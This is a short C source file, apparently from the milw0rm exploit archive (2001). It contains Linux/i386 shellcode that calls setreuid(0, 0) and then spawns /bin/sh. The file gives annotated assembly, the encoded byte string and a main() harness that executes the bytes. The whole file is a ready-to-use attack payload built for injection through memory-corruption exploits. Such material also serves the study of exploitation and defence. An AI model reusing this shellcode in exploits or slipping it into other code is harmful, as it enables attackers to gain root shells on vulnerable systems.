/*
 * $Id: execve-setreuid.c,v 1.1 2001/05/02 18:10:52 raptor Exp $
 *
 * execve-setreuid.c v1.0 - shellcode for Linux/i386
 * Copyright (c) 2001 Raptor <raptor@0xdeadbeef.eu.org>
 *
 * This shellcode does an execve of /bin/sh
 * after a setreuid(0, 0), then exit()s.
 *
 */
/* * * * * * * * * * * * * * * * * * * * * * * * * * * * *
 * ASM Code                                              *
 * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
 * ; setreuid(0, 0)
 * xorl %eax,%eax
 * xorl %ebx,%ebx
 * xorl %ecx,%ecx
 * movb $70,%al
 * int $0x80
 *
 * ; execve(foo[0], foo, 0);
 * jmp 0x1d
 * popl %esi
 * movb %eax,0x7(%esi)
 * movl %eax,0xc(%esi)
 * movl %esi,0x8(%esi)
 * movl %esi,%ebx
 * leal 0x8(%esi),%ecx
 * leal 0xc(%esi),%edx
 * movb $11,%al
 * int $0x80
 *
 * ; exit(0)
 * xorl %eax,%eax
 * xorl %ebx,%ebx
 * incl %eax
 * int $0x80
 *
 * call -0x22
 * .ascii "/bin/sh"
 * * * * * * * * * * * * * * * * * * * * * * * * * * * * */

char code[] =
  "\x31\xc0\x31\xdb\x31\xc9\xb0\x46\xcd\x80\xeb\x1d"
  "\x5e\x88\x46\x07\x89\x46\x0c\x89\x76\x08\x89\xf3"
  "\x8d\x4e\x08\x8d\x56\x0c\xb0\x0b\xcd\x80\x31\xc0"
  "\x31\xdb\x40\xcd\x80\xe8\xde\xff\xff\xff/bin/sh";

main()
{
  int (*funct)();
  funct = (int (*)()) code;
  (int)(*funct)();
}


// milw0rm.com [2001-05-07]